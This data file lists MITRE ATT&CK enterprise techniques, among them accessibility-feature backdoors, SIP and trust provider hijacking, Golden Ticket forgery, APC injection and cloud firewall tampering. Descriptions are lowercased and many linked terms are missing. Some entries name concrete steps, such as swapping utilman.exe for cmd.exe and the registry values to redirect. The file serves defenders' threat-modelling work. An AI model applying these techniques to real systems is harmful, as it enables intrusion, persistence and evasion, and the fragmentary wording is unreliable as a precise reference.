attack-pattern--70857657-bd0b-4695-ad3e-b13f92cac1b4,['enterprise-attack'],['T1578.003'],Delete Cloud Instance,an adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence   deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable_  an adversary may also  create cloud  and later terminate the instance after achieving their objectives_ citation  mandiant m trends      
attack-pattern--70910fbd-58dc-4c1c-8c48-814d11fcd022,['enterprise-attack'],['T1593.003'],Code Repositories,adversaries may search public code repositories for information about victims that can be used during targeting  victims may store code in repositories on various third party websites such as github  gitlab  sourceforge  and bitbucket  users typically interact with code repositories through a web application or command line utilities such as git     adversaries may search various public code repositories for various information about a victim  public code repositories can often be a source of various general information about victims  such as commonly used programming languages and libraries as well as the names of employees  adversaries may also identify more sensitive data  including accidentally leaked credentials or api keys_ citation  github cloud service credentials  information from these sources may reveal opportunities for other forms of reconnaissance  ex   phishing for  establishing operational resources  ex   compromise  or  compromise  and or initial access  ex   valid  or      note    this is distinct from  code  which focuses on  from private and internally hosted code repositories 
attack-pattern--70d81154-b187-45f9-8ec5-295d01255979,['enterprise-attack'],['T1574.005'],Executable Installer File Permissions Weakness,adversaries may execute their own malicious payloads by hijacking the binaries used by an installer  these processes may automatically execute specific binaries as part of their functionality or to perform other actions  if the permissions on the file system directory containing a target binary  or permissions on the binary itself  are improperly set  then the target binary may be overwritten with another binary using user level permissions and executed by the original process  if the original process and thread are running under a higher permissions level  then the replaced binary will also execute under higher level permissions  which could include system_  another variation of this technique can be performed by taking advantage of a weakness that is common in executable  self extracting installers  during the installation process  it is common for installers to use a subdirectory within the  temp  directory to unpack binaries such as dlls  exes  or other payloads  when installers create subdirectories and files they often do not set appropriate permissions to restrict write access  which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process  this behavior is related to and may take advantage of  dll search order   adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level  some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code  this behavior is related to  bypass user account  several examples of this weakness in existing common installers have been reported to software vendors    citation  executable installers are vulnerable  if the executing process is set to run at a specific time or during a certain event  e_g_  system bootup  then this technique can also be used for persistence 
attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5,['enterprise-attack'],['T1546.008'],Accessibility Features,adversaries may establish persistence and or elevate privileges by executing malicious content triggered by accessibility features  windows contains accessibility features that may be launched with a key combination before a user has logged in  ex  when the user is on the windows logon screen   an adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system_  two common accessibility programs are c  windows system   sethc_exe  launched when the shift key is pressed five times and c  windows system   utilman_exe  launched when the windows   u key combination is pressed  the sethc_exe program is often referred to as  sticky keys   and has been used by adversaries for unauthenticated access through a remote desktop login screen   citation  fireeye hikit rootkit   depending on the version of windows  an adversary may take advantage of these features in different ways  common methods used by adversaries include replacing accessibility feature binaries or pointers references to these binaries in the registry  in newer versions of windows  the replaced binary needs to be digitally signed for x   systems  the binary must reside in  systemdir    and it must be protected by windows file or resource protection  wfp wrp    citation  defcon     sticky keys  the  image file execution options  debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced_  for simple binary replacement on windows xp and later as well as and windows server      r  and later  for example  the program  e_g_  c  windows system   utilman_exe  may be replaced with  cmd_exe   or another program that provides backdoor access   subsequently  pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over  remote desktop  will cause the replaced file to be executed with system privileges   citation  tilbury        other accessibility features exist that may also be leveraged in a similar fashion   citation  defcon     sticky keys  citation  narrator accessibility abuse     on screen keyboard  c  windows system   osk_exe   magnifier  c  windows system   magnify_exe   narrator  c  windows system   narrator_exe   display switcher  c  windows system   displayswitch_exe   app switcher  c  windows system   atbroker_exe
attack-pattern--723e3a2b-ca0d-4daa-ada8-82ea35d3733a,['enterprise-attack'],['T1504'],PowerShell Profile,adversaries may gain persistence and elevate privileges in certain situations by abusing  profiles  a powershell profile   profile_ps   is a script that runs when powershell starts and can be used as a logon script to customize user environments  powershell supports several profiles depending on the user or host program  for example  there can be different profiles for powershell host programs such as the powershell console  powershell ise or visual studio code  an administrator can also configure a profile that applies to all users and host programs on the local computer   citation  microsoft about profiles    adversaries may modify these profiles to include arbitrary commands  functions  modules  and or powershell drives to gain persistence  every time a user opens a powershell session the modified script will be executed unless the  noprofile flag is used when it is launched   citation  eset turla powershell may         an adversary may also be able to escalate privileges if a script in a powershell profile is loaded and executed by an account with higher privileges  such as a domain administrator   citation  wits end and shady powershell profiles 
attack-pattern--72b5ef57-325c-411b-93ca-a3ca6fa17e31,['enterprise-attack'],['T1198'],SIP and Trust Provider Hijacking,in user mode  windows authenticode  citation  microsoft authenticode  digital signatures are used to verify a file's origin and integrity  variables that may be used to establish trust in signed code  ex  a driver with a valid microsoft signature may be handled as safe   the signature validation process is handled via the winverifytrust application programming interface  api  function    citation  microsoft winverifytrust  which accepts an inquiry and coordinates with the appropriate trust provider  which is responsible for validating parameters of a signature   citation  spectorops subverting trust sept        because of the varying executable file types and corresponding signature formats  microsoft created software components called subject interface packages  sips   citation  eduardosblog sips july       to provide a layer of abstraction between api functions and files  sips are responsible for enabling api functions to create  retrieve  calculate  and verify signatures  unique sips exist for most file formats  executable  powershell  installer  etc_  with catalog signing providing a catch all   citation  microsoft catalog files and signatures april        and are identified by globally unique identifiers  guids    citation  spectorops subverting trust sept        similar to  code  adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system  adversaries may hijack sip and trust provider components to mislead operating system and whitelisting tools to classify malicious  or any  code as signed by   citation  spectorops subverting trust sept          modifying the dll and funcname registry values in hklm software  wow    node  microsoft cryptography oid encodingtype   cryptsipdllgetsigneddatamsg  sip_guid  that point to the dynamic link library  dll  providing a sip s cryptsipdllgetsigneddatamsg function  which retrieves an encoded digital certificate from a signed file  by pointing to a maliciously crafted dll with an exported function that always returns a known good signature value  ex  a microsoft signature for portable executables  rather than the file s real signature  an adversary can apply an acceptable signature value to all files using that sip  citation  github sip poc sept        although a hash mismatch will likely occur  invalidating the signature  since the hash returned by the function will not match the value computed from the file _   modifying the dll and funcname registry values in hklm software  wow    node  microsoft cryptography oid encodingtype   cryptsipdllverifyindirectdata  sip_guid  that point to the dll providing a sip s cryptsipdllverifyindirectdata function  which validates a file s computed hash against the signed hash value  by pointing to a maliciously crafted dll with an exported function that always returns true  indicating that the validation was successful   an adversary can successfully validate any file  with a legitimate signature  using that sip  citation  github sip poc sept        with or without hijacking the previously mentioned cryptsipdllgetsigneddatamsg function   this registry value could also be redirected to a suitable exported function from an already present dll  avoiding the requirement to drop and execute a new file on disk_   modifying the dll and function registry values in hklm software  wow    node  microsoft cryptography providers trust finalpolicy  trust provider guid  that point to the dll providing a trust provider s finalpolicy function  which is where the decoded and parsed signature is checked and the majority of trust decisions are made  similar to hijacking sip s cryptsipdllverifyindirectdata function  this value can be redirected to a suitable exported function from an already present dll or a maliciously crafted dll  though the implementation of a trust provider is complex _     note    the above hijacks are also possible without modifying the registry via  dll search order   hijacking sip or trust provider components can also enable persistent code execution  since these malicious components may be invoked by any application that performs code signing or signature validation   citation  spectorops subverting trust sept      
attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08,['enterprise-attack'],['T1087'],Account Discovery,adversaries may attempt to get a listing of accounts on a system or within an environment  this information can help adversaries determine which accounts exist to aid in follow on behavior 
attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea,['enterprise-attack'],['T1090'],Proxy,adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure  many tools exist that enable traffic redirection through proxies or port redirection  including  zxproxy  and zxportmap   citation  trend micro apt attack tools  adversaries use these types of proxies to manage command and control communications  reduce the number of simultaneous outbound network connections  provide resiliency in the face of connection loss  or to ride over existing trusted communications paths between victims to avoid suspicion  adversaries may chain together multiple proxies to further disguise the source of malicious traffic_  adversaries can also take advantage of routing schemes in content delivery networks  cdns  to proxy command and control traffic 
attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830,['enterprise-attack'],['T1059'],Command and Scripting Interpreter,adversaries may abuse command and script interpreters to execute commands  scripts  or binaries  these interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms  most systems come with some built in command line interface and scripting capabilities  for example  macos and linux distributions include some flavor of  unix  while windows installations include the  windows command  and   there are also cross platform interpreters such as  as well as those commonly associated with client applications such as  and  visual   adversaries may abuse these technologies in various ways as a means of executing arbitrary commands  commands and scripts can be embedded in  initial  payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing c   adversaries may also execute commands through interactive terminals shells  as well as utilize various  remote  in order to achieve remote execution_ citation  powershell remote commands  citation  cisco ios software integrity assurance   command history  citation  remote shell execution in python 
attack-pattern--74d2a63f-3c7b-4852-92da-02d8fbab16da,['enterprise-attack'],['T1562.006'],Indicator Blocking,an adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed  this could include maliciously redirecting  citation  microsoft lamin sept       or even disabling host based sensors  such as event tracing for windows  etw   citation  microsoft about event tracing       by tampering settings that control the collection and flow of event telemetry   citation  medium event tracing tampering       these settings may be stored on the system in configuration files and or in the registry as well as being accessible via administrative utilities such as  or  windows management   etw interruption can be achieved multiple ways  however most directly by defining conditions using the  set etwtraceprovider cmdlet or by interfacing directly with the registry to make alterations_  in the case of network based reporting of indicators  an adversary may block traffic associated with reporting to prevent central analysis  this may be accomplished by many means  such as stopping a local process responsible for forwarding telemetry and or creating a host based firewall rule to block traffic to specific hosts responsible for aggregating events  such as security information and event management  siem  products_  in linux environments  adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors  
attack-pattern--7610cada-1499-41a4-b3dd-46467b68d177,['enterprise-attack'],['T1136.002'],Domain Account,adversaries may create a domain account to maintain access to victim systems  domain accounts are those managed by active directory domain services where access and permissions are configured across systems and services that are part of that domain  domain accounts can cover user  administrator  and service accounts  with a sufficient level of access  the net user  add  domain command can be used to create a domain account_  such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system 
attack-pattern--76551c52-b111-4884-bc47-ff3e728f0156,['enterprise-attack'],['T1589.003'],Employee Names,adversaries may gather employee names that can be used during targeting  employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and or craft more believable lures_  adversaries may easily gather employee names  since they may be readily available and exposed via online or other accessible data sets  ex   social  or  search victim owned  opm leak  gathering this information may reveal opportunities for other forms of reconnaissance  ex   search open  or  phishing for  establishing operational resources  ex   compromise  and or initial access  ex   or  valid
attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0,['enterprise-attack'],['T1482'],Domain Trust Discovery,adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in windows multi domain forest environments  domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain_ citation  microsoft trusts  domain trusts allow the users of the trusted domain to access resources in the trusting domain  the information discovered may help the adversary conduct  sid history   pass the  and  adsecurity forging trust tickets  citation  harmj y domain trusts  domain trusts can be enumerated using the  dsenumeratedomaintrusts    win   api call  _net methods  and ldap_ citation  harmj y domain trusts  the windows utility  is known to be used by adversaries to enumerate domain trusts_ citation  microsoft operation wilysupply 
attack-pattern--768dce68-8d0d-477a-b01d-0eea98b963a1,['enterprise-attack'],['T1558.001'],Golden Ticket,adversaries who have the krbtgt account password hash may forge kerberos ticket granting tickets  tgt   also known as a golden ticket_ citation  adsecurity kerberos gt aug       golden tickets enable adversaries to generate authentication material for any account in active directory_ citation  cert eu golden ticket protection    using a golden ticket  adversaries are then able to request ticket granting service  tgs  tickets  which enable access to specific resources  golden tickets require adversaries to interact with the key distribution center  kdc  in order to obtain tgs_ citation  adsecurity detecting forged tickets   the kdc service runs all on domain controllers that are part of an active directory domain  krbtgt is the kerberos key distribution center  kdc  service account and is responsible for encrypting and signing all kerberos tickets_ citation  adsecurity kerberos and krbtgt  the krbtgt password hash may be obtained using  os credential  and privileged access to a domain controller 
attack-pattern--772bc7a8-a157-42cc-8728-d648e25c7fe7,['enterprise-attack'],['T1175'],Component Object Model and Distributed COM,  this technique has been deprecated  please use  distributed component object  and  component object   adversaries may use the windows component object model  com  and distributed component object model  dcom  for local code execution or to execute on remote systems as part of lateral movement    com is a component of the native windows application programming interface  api  that enables interaction between software objects  or executable code that implements one or more interfaces_ citation  fireeye hunting com june       through com  a client object can call methods of server objects  which are typically dynamic link libraries  dll  or executables  exe _ citation  microsoft com  dcom is transparent middleware that extends the functionality of component object model  com   citation  microsoft com  beyond a local computer using remote procedure call  rpc  technology_ citation  fireeye hunting com june        permissions to interact with local and remote server com objects are specified by access control lists  acl  in the registry   citation  microsoft com acl  citation  microsoft process wide com keys  citation  microsoft system wide com keys  by default  only administrators may remotely activate and launch com objects through dcom_  adversaries may abuse com for local command and or payload execution  various com interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as c  c    java  and vbscript_ citation  microsoft com  specific com objects also exists to directly perform functions beyond code execution  such as creating a  scheduled  fileless download execution  and other adversary behaviors such as privilege escalation and persistence_ citation  fireeye hunting com june       citation  projectzero file write eop apr        adversaries may use dcom for lateral movement  through dcom  adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through office applications  citation  enigma outlook dcom lateral movement nov       as well as other windows objects that contain insecure methods_ citation  enigma mmc   com jan       citation  enigma dcom lateral movement jan       dcom can also execute macros in existing documents  citation  enigma excel dcom sept       and may also invoke  dynamic data   dde  execution directly through a com created instance of a microsoft office application  citation  cyberreason dcom dde lateral movement nov        bypassing the need for a malicious document 
attack-pattern--774a3188-6ba9-4dc4-879d-d54ee48a5ce9,['enterprise-attack'],['T1020'],Automated Exfiltration,adversaries may exfiltrate data  such as sensitive documents  through the use of automated processing after being gathered during collection    when automated exfiltration is used  other exfiltration techniques likely apply as well to transfer the information out of the network  such as  exfiltration over c   and  exfiltration over alternative
attack-pattern--774ad5bb-2366-4c13-a8a9-65e50b292e7c,['enterprise-attack'],['T1592.004'],Client Configurations,adversaries may gather information about the victim's client configurations that can be used during targeting  information about client configurations may include a variety of details and settings  including operating system version  virtualization  architecture  ex     or    bit   language  and or time zone_  adversaries may gather this information in various ways  such as direct collection actions via  active   ex  listening ports  server banners  user agent strings  or  phishing for  adversaries may also compromise sites then include malicious content designed to collect host information from visitors_ citation  att scanbox  information about the client configurations may also be exposed to adversaries via online or other accessible data sets  ex  job postings  network maps  assessment reports  resumes  or purchase invoices   gathering this information may reveal opportunities for other forms of reconnaissance  ex   search open  or  search open technical  establishing operational resources  ex   develop  or  obtain  and or initial access  ex   supply chain  or  external remote
attack-pattern--77532a55-c283-4cd2-bc5d-2d0b65e9d88c,['enterprise-attack'],['T1562.007'],Disable or Modify Cloud Firewall,adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources  cloud firewalls are separate from system firewalls that are described in  disable or modify system    cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted ip addresses via expected ports and protocols  an adversary may introduce new firewall rules or policies to allow access into a victim cloud environment  for example  an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any tcp ip connectivity_ citation  expel io evil in aws   modifying or disabling a cloud firewall may enable adversary c  communications  lateral movement  and or data exfiltration that would otherwise not be allowed 
attack-pattern--77eae145-55db-4519-8ae5-77b0c7215d69,['enterprise-attack'],['T1036.002'],Right-to-Left Override,adversaries may abuse the right to left override  rtlo or rlo  character  u    e  to disguise a string and or file name to make it appear benign  rtlo is a non printing unicode character that causes the text that follows it to be displayed in reverse  for example  a windows screensaver executable named march     u   excod_scr will display as march    rcs_docx  a javascript file named photo_high_re u   egnp_js will be displayed as photo_high_resj_png_ citation  infosecinstitute rtlo technique   adversaries may abuse the rtlo character as a means of tricking a user into executing what they think is a benign file type  a common use of this technique is with  spearphishing   since it can trick both end users and defenders if they are not aware of how their tools display and render the rtlo character  use of the rtlo character has been seen in many targeted intrusion attempts and criminal activity_ citation  trend micro plead rtlo  citation  kaspersky rtlo cyber crime  rtlo can be used in the windows registry as well  where regedit_exe displays the reversed characters but the command line tool reg_exe does not by default 
attack-pattern--7807d3a4-a885-4639-a786-c1ed41484970,['enterprise-attack'],['T1588.001'],Malware,adversaries may buy  steal  or download malware that can be used during targeting  malicious software can include payloads  droppers  post compromise tools  backdoors  packers  and c  protocols  adversaries may acquire malware to support their operations  obtaining a means for maintaining control of remote machines  evading defenses  and executing post compromise behaviors_  in addition to downloading free malware from the internet  adversaries may purchase these capabilities from third party entities  third party entities can include technology companies that specialize in malware development  criminal marketplaces  including malware as a service  or maas   or from individuals  in addition to purchasing malware  adversaries may steal and repurpose malware from third party entities  including other adversaries  
attack-pattern--791481f8-e96a-41be-b089-a088763083d4,['enterprise-attack'],['T1542.002'],Component Firmware,adversaries may modify component firmware to persist on systems  some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or bios  this technique may be similar to  system  but conducted upon other system components devices that may not have the same capability or level of integrity checking_  malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re images  as well as a way to evade host software based defenses and integrity checks 
attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69,['enterprise-attack'],['T1070'],Indicator Removal,adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses  various artifacts may be created by an adversary or something that can be attributed to an adversary s actions  typically these artifacts are used as defensive indicators related to monitored events  such as strings from downloaded files  logs that are generated from user actions  and other data analyzed by defenders  location  format  and type of artifact  such as command or login history  are often specific to each platform_  removal of these indicators may interfere with event collection  reporting  or other processes used to detect intrusion activity  this may compromise the integrity of security solutions by causing notable events to go unreported  this activity may also impede forensic analysis and incident response  due to lack of sufficient data to determine what occurred 
attack-pattern--79a4052e-1a89-4b09-aea6-51f1d11fe19c,['enterprise-attack'],['T1048.001'],Exfiltration Over Symmetric Encrypted Non-C2 Protocol,adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel  the data may also be sent to an alternate network location from the main command and control server    symmetric encryption algorithms are those that use shared or the same keys secrets on each end of the channel  this requires an exchange or pre arranged agreement possession of the value used to encrypt and decrypt data    network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged  but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms  ex  rc   aes  vice using mechanisms that are baked into a protocol  this may result in multiple layers of encryption  in protocols that are natively encrypted such as https  or encryption in protocols that not typically encrypted  such as http or ftp  
attack-pattern--79a47ad0-fc3b-4821-9f01-a026b1ddba21,['enterprise-attack'],['T1137.001'],Office Template Macros,adversaries may abuse microsoft office templates to obtain persistence on a compromised system  microsoft office contains templates that are part of common office applications and are used to customize styles  the base templates within the application are used each time an application starts   citation  microsoft change normal template   office visual basic for applications  vba  macros  citation  msdn vba in office  can be inserted into the base template and used to execute code when the respective office application starts in order to obtain persistence  examples for both word and excel have been discovered and published  by default  word has a normal_dotm template created that can be modified to include a malicious macro  excel does not have a template file created by default  but one can be added that will automatically be loaded_ citation  enigma x  normal_dotm  citation  hexacorn office template macros  shared templates may also be stored and pulled from remote locations_ citation  globaldotname jun         word normal_dotm location  c  users  lt username gt  appdata roaming microsoft templates normal_dotm  excel personal_xlsb location  c  users  lt username gt  appdata roaming microsoft excel xlstart personal_xlsb  adversaries may also change the location of the base template to point to their own by hijacking the application's search order  e_g  word      will first look for normal_dotm under c  program files  x    microsoft office root office     or by modifying the globaldotname registry key  by modifying the globaldotname registry key an adversary can specify an arbitrary location  file name  and file extension to use for the template that will be loaded on application startup  to abuse globaldotname  adversaries may first need to register the template as a trusted document or place it in a trusted location_ citation  globaldotname jun         an adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros 
attack-pattern--79da0971-3147-4af6-a4f5-e8cd447cd795,['enterprise-attack'],['T1583.003'],Virtual Private Server,adversaries may rent virtual private servers  vpss  that can be used during targeting  there exist a variety of cloud service providers that will sell virtual machines containers as a service  by utilizing a vps  adversaries can make it difficult to physically tie back operations to them  the use of cloud infrastructure can also make it easier for adversaries to rapidly provision  modify  and shut down their infrastructure_  acquiring a vps for use in later stages of the adversary lifecycle  such as command and control  can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers  adversaries may also acquire infrastructure from vps service providers that are known for renting vpss with minimal registration information  allowing for more anonymous acquisitions of infrastructure 
attack-pattern--7ad38ef1-381a-406d-872a-38b136eb5ecc,['enterprise-attack'],['T1213.001'],Confluence,adversaries may leverage confluence repositories to mine valuable information  often found in development environments alongside atlassian jira  confluence is generally used to store development related documentation  however  in general may contain more diverse categories of useful information  such as     policies  procedures  and standards   physical   logical network diagrams   system architecture diagrams   technical system documentation   testing   development credentials   work   project schedules   source code snippets   links to network shares and other internal resources
attack-pattern--7b211ac6-c815-4189-93a9-ab415deca926,['enterprise-attack'],['T1550.003'],Pass the Ticket,adversaries may  pass the ticket  using stolen kerberos tickets to move laterally within an environment  bypassing normal system access controls  pass the ticket  ptt  is a method of authenticating to a system using kerberos tickets without having access to an account's password  kerberos authentication can be used as the first step to lateral movement to a remote system_  when preforming ptt  valid kerberos tickets for  valid  are captured by  os credential  a user's service tickets or ticket granting ticket  tgt  may be obtained  depending on the level of access  a service ticket allows for access to a particular resource  whereas a tgt can be used to request service tickets from the ticket granting service  tgs  to access any resource the user has privileges to access_ citation  adsecurity ad kerberos attacks  citation  gentilkiwi pass the ticket   a  silver  can be obtained for services that use kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource  e_g_  sharepoint _ citation  adsecurity ad kerberos attacks   a  golden  can be obtained for the domain using the key distribution service account krbtgt account ntlm hash  which enables generation of tgts for any account in active directory_ citation  campbell        adversaries may also create a valid kerberos ticket using other user information  such as stolen password hashes or aes keys  for example   overpassing the hash  involves using a ntlm password hash to authenticate as a user  i_e   pass the  while also using the password hash to create a valid kerberos ticket_ citation  stealthbits overpass the hash 
attack-pattern--7b50a1d3-4ca7-45d1-989d-a6503f04bfe1,['enterprise-attack'],['T1609'],Container Administration Command,adversaries may abuse a container administration service to execute commands within a container  a container administration service such as the docker daemon  the kubernetes api server  or the kubelet may allow remote management of containers within an environment_ citation  docker daemon cli  citation  kubernetes api  citation  kubernetes kubelet   in docker  adversaries may specify an entrypoint during container deployment that executes a script or command  or they may use a command such as docker exec to execute a command within a running container_ citation  docker entrypoint  citation  docker exec  in kubernetes  if an adversary has sufficient permissions  they may gain remote execution in a container in the cluster via interaction with the kubernetes api server  the kubelet  or by running a command such as kubectl exec_ citation  kubectl exec get shell 
attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18,['enterprise-attack'],['T1083'],File and Directory Discovery,adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system  adversaries may use the information from  file and directory  during automated discovery to shape follow on behaviors  including whether or not the adversary fully infects the target and or attempts specific actions_  many command shell utilities can be used to obtain this information  examples include dir  tree  ls  find  and locate_ citation  windows commands jpcert  custom tools may also be used to gather file and directory information and interact with the  native  adversaries may also leverage a  network device  on network devices to gather file and directory information  e_g  dir  show flash  and or nvram  
attack-pattern--7bd9c723-2f78-4309-82c5-47cad406572b,['enterprise-attack'],['T1568'],Dynamic Resolution,adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations  this may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications  these calculations can be used to dynamically adjust parameters such as the domain name  ip address  or port number the malware uses for command and control_  adversaries may use dynamic resolution for the purpose of  fallback  when contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control_ citation  talos ccleanup       citation  fireeye poshspy april       citation  eset sednit      activity 
attack-pattern--7bdca9d5-d500-4d7d-8c52-5fd47baf4c0c,['enterprise-attack'],['T1036.004'],Masquerade Task or Service,adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign  tasks services executed by the task scheduler or systemd will typically be given a name and or description_ citation  technet schtasks  citation  systemd service units  windows services will have a service name as well as a display name  many benign tasks and services exist that have commonly associated names  adversaries may give tasks or services names that are similar or identical to those of legitimate ones_  tasks or services contain other fields  such as a description  that adversaries may attempt to make appear legitimate_ citation  palo alto shamoon nov       citation  fysbis dr web analysis 
attack-pattern--7c0f17c9-1af6-4628-9cbd-9e45482dd605,['enterprise-attack'],['T1055.004'],Asynchronous Procedure Call,adversaries may inject malicious code into processes via the asynchronous procedure call  apc  queue in order to evade process based defenses as well as possibly elevate privileges  apc injection is a method of executing arbitrary code in the address space of a separate live process    apc injection is commonly performed by attaching malicious code to the apc queue  citation  microsoft apc  of a process's thread  queued apc functions are executed when the thread enters an alterable state_ citation  microsoft apc  a handle to an existing victim process is first created with native windows api calls such as openthread  at this point queueuserapc can be used to invoke a function  such as loadlibraya pointing to a malicious dll     a variation of apc injection  dubbed  early bird injection   involves creating a suspended process in which malicious code can be written and executed before the process' entry point  and potentially subsequent anti malware hooks  via an apc   citation  cyberbit early bird apr       atombombing  citation  ensil atombombing oct       is another variation that utilizes apcs to invoke malicious code previously written to the global atom table_ citation  microsoft atom table   running code in the context of another process may allow access to the process's memory  system network resources  and possibly elevated privileges  execution via apc injection may also evade detection from security products since the execution is masked under a legitimate process 
attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1,['enterprise-attack'],['T1020.001'],Traffic Duplication,adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised network infrastructure   traffic mirroring is a native feature for some network devices and used for network analysis and may be configured to duplicate traffic and forward to one or more destinations for analysis by a network analyzer or other monitoring device   citation  cisco traffic mirroring  citation  juniper traffic mirroring   adversaries may abuse traffic mirroring to mirror or redirect network traffic through other network infrastructure they control  malicious modifications to network devices to enable traffic redirection may be possible through  or  patch system  cisco blog legacy device attacks  adversaries may use traffic duplication in conjunction with  network   input  or  depending on the goals and objectives of the adversary 
attack-pattern--7c93aa74-4bc0-4a9e-90ea-f25f86301566,['enterprise-attack'],['T1138'],Application Shimming,the microsoft windows application compatibility infrastructure framework  application shim  was created to allow for backward compatibility of software as the operating system codebase changes over time  for example  the application shimming feature allows developers to apply fixes to applications  without rewriting code  that were created for windows xp so that it will work with windows      citation  elastic process injection july       within the framework  shims are created to act as a buffer between the program  or more specifically  the import address table  and the windows os  when a program is executed  the shim cache is referenced to determine if the program requires the use of the shim database  _sdb   if so  the shim database uses  to redirect the code as necessary in order to communicate with the os    a list of all shims currently installed by the default windows installer  sdbinst_exe  is kept in      windir  apppatch sysmain_sdb   hklm software microsoft windows nt currentversion appcompatflags installedsdb  custom databases are stored in      windir  apppatch custom    windir  apppatch apppatch   custom   hklm software microsoft windows nt currentversion appcompatflags custom  to keep shims secure  windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim  however  certain shims can be used to  bypass user account   uac   redirectexe   inject dlls into processes  injectdll   disable data execution prevention  disablenx  and structure exception handling  disableseh   and intercept memory addresses  getprocaddress   similar to  utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges  install backdoors  disable defenses like windows defender  etc 
attack-pattern--7d20fff9-8751-404e-badd-ccd71bda0236,['enterprise-attack'],['T1647'],Plist File Modification,adversaries may modify property list files  plist files  to enable other malicious activity  while also potentially evading and bypassing system defenses  macos applications use plist files  such as the info_plist file  to store properties and configuration settings that inform the operating system how to handle the application at runtime  plist files are structured metadata in key value pairs formatted in xml based on apple's core foundation dtd  plist files can be saved in text or binary format_ citation  fileinfo plist file description    adversaries can modify key value pairs in plist files to influence system behaviors  such as hiding the execution of an application  i_e   hidden  or running additional commands for persistence  ex   launch   or  re opened   for example  adversaries can add a malicious application path to the    library preferences com_apple_dock_plist  file  which controls apps that appear in the dock  adversaries can also modify the lsuielement key in an application s info_plist file  to run the app in the background  adversaries can also insert key value pairs to insert environment variables  such as lsenvironment  to enable persistence via  dynamic linker  wardle chp  persistence 
attack-pattern--7d57b371-10c2-45e5-b3cc-83a8fb380e4c,['enterprise-attack'],['T1546.009'],AppCert DLLs,adversaries may establish persistence and or elevate privileges by executing malicious content triggered by appcert dlls loaded into processes  dynamic link libraries  dlls  that are specified in the appcertdlls registry key under hkey_local_machine system currentcontrolset control session manager  are loaded into every process that calls the ubiquitously used application programming interface  api  functions createprocess  createprocessasuser  createprocesswithloginw  createprocesswithtokenw  or winexec   citation  elastic process injection july        similar to  process  this value can be abused to obtain elevated privileges by causing a malicious dll to be loaded and run in the context of separate processes on the computer  malicious appcert dlls may also provide persistence by continuously being triggered by api activity 
attack-pattern--7d6f590f-544b-45b4-9a42-e0805f342af3,['enterprise-attack'],['T1191'],CMSTP,the microsoft connection manager profile installer  cmstp_exe  is a command line program used to install connection manager service profiles   citation  microsoft connection manager oct       cmstp_exe accepts an installation information file  inf  as a parameter and installs a service profile leveraged for remote access connections_  adversaries may supply cmstp_exe with inf files infected with malicious commands   citation  twitter cmstp usage jan       similar to     squiblydoo   cmstp_exe may be abused to load and execute dlls  citation  msitpros cmstp aug        and or com scriptlets  sct  from remote servers   citation  twitter cmstp jan        citation  github ultimate applocker bypass list   citation  endurant cmstp july       this execution may also bypass applocker and other whitelisting defenses since cmstp_exe is a legitimate  signed microsoft application_  cmstp_exe can also be abused to  bypass user account  and execute arbitrary commands from a malicious inf through an auto elevated com interface   citation  msitpros cmstp aug        citation  github ultimate applocker bypass list   citation  endurant cmstp july      
attack-pattern--7d751199-05fa-4a72-920f-85df4506c76c,['enterprise-attack'],['T1188'],Multi-hop Proxy,to disguise the source of malicious traffic  adversaries may chain together multiple proxies  typically  a defender will be able to identify the last proxy traffic traversed before it enters their network  the defender may or may not be able to identify any previous proxies before the last hop proxy  this technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source 
